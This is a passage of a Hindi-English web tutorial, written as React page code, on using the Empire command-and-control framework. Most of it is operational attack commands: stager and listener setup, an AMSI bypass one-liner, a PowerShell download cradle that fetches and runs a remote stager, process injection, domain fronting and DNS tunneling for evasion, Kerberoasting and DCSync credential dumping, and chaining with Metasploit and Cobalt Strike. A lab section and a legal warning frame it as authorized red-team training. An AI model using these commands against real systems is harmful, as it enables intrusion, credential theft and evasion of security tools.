# Empire agent से SharpHound run करो
usemodule powershell/situational_awareness/bloodhound
execute

# Empire + Rubeus (Kerberos attacks):
# Empire agent से Rubeus execute करो
usemodule powershell/management/rubeus
execute

# Full Red Team pipeline:
# 1. Phishing → Empire stager delivery
# 2. Empire agent → credential harvesting
# 3. CrackMapExec → lateral movement
# 4. BloodHound → AD path analysis
# 5. Empire persistence → maintain access
# 6. Data exfiltration → Empire exfil modules`}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        Empire practice के लिए safe lab बनाओ:
      </p>
      <CodeBlock
        title="Lab Setup"
        code={`# दो VMs चाहिए:
# 1. Kali Linux (attacker) — Empire install
# 2. Windows 10/11 (victim) — target

# Network setup:
# VirtualBox Host-Only Adapter
# Attacker: 192.168.56.100
# Victim: 192.168.56.101

# Practice workflow:
# 1. Empire server start करो
# 2. HTTP listener setup करो
# 3. BAT stager generate करो
# 4. Victim VM पर stager transfer और execute करो
# 5. Agent connect होगा
# 6. Post-exploitation modules try करो
# 7. Credential harvesting try करो
# 8. Lateral movement practice करो
# 9. Persistence setup करो
# 10. Detection try करो — logging enable करो

# Safe practice rules:
# केवल अपने lab में करें
# Real network पर कभी न करें
# VirtualBox snapshots रखो — आसानी से reset कर सको`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Empire Usage"
        code={`# Custom listener profiles (evasion):
uselistener http
set DefaultProfile /admin/get.php,/news.php,/login/process.jsp|Mozilla/5.0
set Host http://your-domain.com
execute

# Obfuscated stager (AV bypass):
usestager windows/launcher_ps1
set Obfuscate True
generate

# Empire REST API (automation):
# Empire 5.x में REST API support है
# http://localhost:1337/api/docs

# Plugin system:
useplugin
# Custom plugins install कर सकते हो

# Multi-hop C2:
# External listener → redirector → internal listener
# Firewall bypass technique

# Custom stager (C#):
usestager windows/launcher_csharp
set Listener http
set Obfuscate True
generate

# Agent config customization:
set WorkingHours 9:00-17:00
set KillDate 2026-12-31
set DefaultDelay 10
set Jitter 0.3`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Empire free है?', a: 'हाँ, Empire पूरी तरह free और open source है। BC-SECURITY maintain करता है। Starkiller GUI भी free है।' },
          { q: 'Empire vs Metasploit कौन सा use करें?', a: 'Empire post-exploitation के लिए best है — PowerShell agents lightweight हैं। Metasploit exploitation के लिए best है — ज़्यादा exploits हैं। दोनों combo में use करो।' },
          { q: 'क्या Empire detect होता है?', a: 'हाँ, PowerShell logging enable हो तो detect होता है। AMSI भी block कर सकता है। Evasion techniques use करो — obfuscation, AMSI bypass।' },
          { q: 'DNS listener क्यों use करें?', a: 'DNS traffic rarely block होता है — firewall bypass के लिए best है। Slow है लेकिन stealthy है। Restricted networks में काम करता है।' },
          { q: 'Linux/Mac पर काम करता है?', a: 'हाँ, Empire 5.x Python agents support करता है — Linux और macOS दोनों के लिए। Python stager generate करो।' },
          { q: 'Starkiller क्या है?', a: 'Starkiller Empire का web-based GUI है जो BC-SECURITY ने बनाया है। Point-and-click interface से listeners, stagers, agents, modules manage कर सकते हो।' },
          { q: 'Empire 5.x vs 4.x क्या फ़र्क है?', a: '5.x में Python 3 support, plugin system, REST API, better evasion, और modular architecture है। 4.x पुराना है और maintain नहीं हो रहा।' },
          { q: 'क्या Empire OSCP में use होता है?', a: 'हाँ, OSCP labs में Empire use होता है post-exploitation के लिए। CRTP certification तो specifically Empire-based है।' },
          { q: 'Agent memory cleanup कैसे करें?', a: 'Agent kill command से agent terminate होता है। Memory cleanup automatic होता है। PowerShell agents memory-resident हैं — process exit पर cleanup हो जाता है।' },
          { q: 'Empire multi-user support करता है?', a: 'हाँ, Empire 5.x में REST API और Starkiller दोनों multi-user support करते हैं। Team members simultaneously access कर सकते हैं।' },
          { q: 'Custom modules कैसे बनाएं?', a: 'Python में module बनाओ। ~/.empire/modules/ में रखो। BaseModule class extend करो। Documentation पढ़ो — module development guide available है।' },
          { q: 'Empire Cobalt Strike से better है?', a: 'Free alternative है। Cobalt Strike commercial है ($5,900/year) और better evasion है। लेकिन Empire free है और 300+ modules हैं। Budget teams के लिए Empire best है।' },
          { q: 'Agent communication encrypt है?', a: 'हाँ, HTTPS listener use करो — encrypted C2 channel बनता है। HTTP listener में encryption optional है। DNS listener में data DNS queries में hide होता है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Integration with Metasploit</h2>
      <p>
        Empire और Metasploit को combine करके complete attack chain बना सकते हो। Metasploit से initial exploitation करो, Empire से post-exploitation। Meterpreter session से Empire agent migrate करना common technique है।
      </p>
      <CodeBlock
        title="Empire + Metasploit Combo"
        code={`# Step 1: Metasploit में handler start करो
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j

# Step 2: Empire में listener setup करो
uselistener http
set Host http://192.168.1.100
set Port 80
execute

# Step 3: Empire stager generate करो
usestager windows/launcher_ps1
set Listener http
generate /tmp/empire.ps1

# Step 4: Meterpreter से Empire stager execute करो
sessions -i 1
powershell_import /tmp/empire.ps1

# अब दोनों active हैं:
# Meterpreter: system-level access
# Empire: PowerShell post-exploitation modules

# Migration technique:
# Meterpreter से Empire agent पर migrate करो
# अगर Meterpreter die हो जाए तो Empire agent बचा रहे`}
      />
      <CodeBlock
        title="Empire + Cobalt Strike Integration"
        code={`# Cobalt Strike से Empire stager deliver करो:

# Step 1: Empire में HTTPS listener setup
uselistener https
set Host https://your-domain.com
set Port 443
set CertPath /path/to/cert.pem
execute

# Step 2: Cobalt Strike में Scripted Web Delivery
# Attacks - Scripted Web Delivery
# URI: /update
# PowerShell stager paste करो
# Listener select करो

# Step 3: Beacon से Empire stager execute करो
# beacon> powershell-import /tmp/empire.ps1
# beacon> powershell Invoke-Empire

# Double C2 channel:
# Cobalt Strike: primary C2
# Empire: backup C2 (redundancy)
# अगर एक detect हो जाए तो दूसरा बचा रहे`}
      />

      <h2>Evasion Techniques</h2>
      <p>
        Empire agents को AV/EDR से बचाने के लिए multiple evasion techniques available हैं। Modern security products PowerShell-based attacks detect करते हैं, इसलिए evasion critical है।
      </p>
      <CodeBlock
        title="AMSI Bypass Techniques"
        code={`# AMSI (Anti-Malware Scan Interface) bypass:
# Agent पर interact करो:
interact <agent_name>

# AMSI bypass module:
usemodule powershell/management/amsi_bypass
execute

# Manual AMSI bypass:
# PowerShell में:
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Constrained Language Mode bypass:
usemodule powershell/management/language_bypass
execute

# Obfuscated stager generate करो:
usestager windows/launcher_ps1
set Obfuscate True
set ObfuscateCommand powershell -enc
generate

# Custom obfuscation:
# IEX download cradle use करो:
# $w=New-Object Net.WebClient;$w.Proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://your-server.com/stager.ps1')`}
      />
      <CodeBlock
        title="Process Injection and Migration"
        code={`# Agent migration — different process में inject:
# अगर current process suspicious है तो legitimate process में migrate करो

# Process list देखो:
shell tasklist

# Notepad में inject करो (less suspicious):
usemodule powershell/management/psinject
set Listener http
set Target PID
execute

# DLL injection:
usemodule powershell/management/dllinject
set Listener http
set Arch x64
execute

# Reflective injection:
# Memory में DLL load होता है — disk पर file नहीं बनती
# Traditional AV detect नहीं कर पाता

# Process hollowing:
# Legitimate process का memory replace करो
# svchost.exe, explorer.exe जैसे processes use करो`}
      />
      <CodeBlock
        title="Network Evasion"
        code={`# C2 traffic hide करने के techniques:

# 1. HTTPS listener — encrypted traffic
uselistener https
set Host https://your-domain.com
set Port 443

# 2. Domain fronting — CDN abuse
uselistener http
set Host cdn-target.com
set DefaultProfile /admin/get.php|Mozilla/5.0

# 3. DNS tunneling — stealthiest
uselistener dbx
set Domain your-domain.com
set Host ns1.your-domain.com

# 4. Redirector — C2 server hide
# External VPS पर redirector setup:
# Nginx reverse proxy → Empire server
# Attacker IP hide रहता है

# 5. Traffic shaping:
set DefaultDelay 30
set Jitter 0.5
# Normal HTTP traffic जैसा दिखे

# 6. User-Agent rotation:
set DefaultProfile /admin.php,/news.jsp|Mozilla/5.0 (Windows NT 10.0)`}
      />

      <h2>Empire for Active Directory Attacks</h2>
      <p>
        Active Directory environments में Empire बहुत powerful है। Domain enumeration, kerberoasting, AS-REP roasting, DCSync — सब Empire modules से possible है। Enterprise networks में AD attack path Empire से automate होता है।
      </p>
      <CodeBlock
        title="Active Directory Enumeration"
        code={`# Domain controller detect करो:
usemodule powershell/situational_awareness/network/get_domain_controller
execute

# Domain users list:
usemodule powershell/situational_awareness/network/get_domain_user
execute

# Domain groups:
usemodule powershell/situational_awareness/network/get_domain_group
execute

# Share enumeration:
usemodule powershell/situational_awareness/network/share_finder
execute

# Kerberoasting:
usemodule powershell/credentials/invoke_kerberoast
execute
# Service account hashes मिलेंगे — offline crack करो

# AS-REP Roasting:
usemodule powershell/credentials/invoke_asreproast
execute

# BloodHound data collection:
usemodule powershell/situational_awareness/network/bloodhound
execute
# Neo4j में import करो — attack paths visualize करो

# DCSync (domain admin required):
usemodule powershell/credentials/mimikatz/dcsync
execute
# सभी domain credentials dump होंगे`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Cobalt Strike</td><td className="py-2 px-3">Commercial C2 framework</td><td className="py-2 px-3">Industry standard, best evasion</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Sliver</td><td className="py-2 px-3">Go-based C2 framework</td><td className="py-2 px-3">Fast, cross-platform, open source</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Metasploit</td><td className="py-2 px-3">Exploitation + post-exploitation</td><td className="py-2 px-3">Largest exploit database</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Covenant</td><td className="py-2 px-3">.NET C2 framework</td><td className="py-2 px-3">ASP.NET based, web UI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dnscat2</td><td className="py-2 px-3">DNS tunneling C2</td><td className="py-2 px-3">Stealthy, DNS-based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Havoc</td><td className="py-2 px-3">Modern C2 framework</td><td className="py-2 px-3">Python agent, web UI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Mythic</td><td className="py-2 px-3">Cross-platform C2</td><td className="py-2 px-3">Docker-based, multiple agents</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">PoshC2</td><td className="py-2 px-3">PowerShell C2</td><td className="py-2 px-3">Python-based server, PS implants</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>PowerShell agents lightweight हैं — Windows में built-in है, कोई extra tool install नहीं करना पड़ता</li>
          <li>DNS listener से firewall bypass करो — stealthy C2 channel बनता है</li>
          <li>Stager obfuscation से AV bypass करो — set Obfuscate True</li>
          <li>Mimikatz module से credentials dump करो — एक click में</li>
          <li>Persistence module से reboot survive करो — registry run keys</li>
          <li>Lateral movement से network spread करो — WMI, PSRemoting</li>
          <li>Starkiller GUI से beginners easily use कर सकते हैं</li>
          <li>Empire + Metasploit combo से full attack chain complete होता है</li>
          <li>REST API से automation scripts बनाओ — batch operations possible</li>
          <li>Agent sleep time adjust करो — beaconing pattern avoid होगा</li>
          <li>Working hours set करो — business hours में ही agent active रहे</li>
          <li>Kill date set करो — engagement end पर agent auto-disable हो जाए</li>
          <li>Custom C2 profiles use करो — normal HTTP traffic जैसा दिखे</li>
          <li>Multi-hop redirectors use करो — C2 server IP hide रहे</li>
          <li>HTTPS listener prefer करो — encrypted traffic detect करना मुश्किल</li>
          <li>DNS listener restricted networks में use करो — firewall bypass होता है</li>
          <li>Stager obfuscation से AV bypass करो — set Obfuscate True</li>
          <li>Agent rename करो — default names detectable हैं</li>
          <li>Screenshot module से evidence collect करो — reporting के लिए</li>
          <li>Keylogger module carefully use करो — privacy concerns हैं</li>
          <li>Token manipulation से privilege escalation करो — Mimikatz alternative</li>
          <li>Persistence methods rotate करो — single method detectable है</li>
        </ul>
      </div>

      <h2>Performance Tuning</h2>
      <p>
        Empire agents की performance tune करना Red Team operations में बहुत important है। Agent delay, jitter, और working hours — ये सभी parameters stealth और efficiency affect करते हैं। बहुत frequent callbacks network noise create करते हैं, और बहुत slow callbacks operator experience affect करते हैं।
      </p>
      <CodeBlock
        title="Agent Performance Tuning"
        code={`# Agent delay — callbacks के बीच time (seconds):
set DefaultDelay 5
# हर 5 seconds में callback आएगा

# Jitter — delay में random variation (0-1):
set Jitter 0.3
# 30% random variation — pattern detect करना मुश्किल

# Working hours — सिर्फ business hours में active:
set WorkingHours 9:00-17:00
# 9 AM से 5 PM तक ही agent active रहे

# Kill date — auto-disable date:
set KillDate 2026-12-31
# इस date के बाद agent automatically kill हो जाएगा

# Recommended settings:
# Stealth operations: DefaultDelay 30, Jitter 0.5
# Active operations: DefaultDelay 5, Jitter 0.2
# Real-time operations: DefaultDelay 1, Jitter 0.1

# Network bandwidth optimization:
# Large output commands के लिए agent delay बढ़ाओ
# Small commands के लिए delay कम कर सकते हो`}
      />
      <CodeBlock
        title="Server Performance"
        code={`# Empire server optimization:

# Database cleanup (old data):
# ~/.empire/server/data/empire.db
# Old agent data cleanup करो

# REST API rate limiting:
# Multiple clients से access कर रहे हो तो
# rate limit set करो server side

# Resource monitoring:
# Empire server CPU/memory monitor करो
# Heavy modules (Mimikatz) resources consume करते हैं

# Multi-user collaboration:
# Starkiller में multi-user support है
# Team members simultaneously access कर सकते हैं
# लेकिन conflicts avoid करने के लिए
# agents divide करो team members में`}
      />

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Empire एक powerful C2 framework है। Unauthorized use serious crime है — computer access, data exfiltration, persistent backdoor सब illegal है। केवल authorized Red Team engagement में ही use करें। सब कुछ document करो। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized computer access अपराध है।
      </div>
    </TutorialLayout>
  )
}
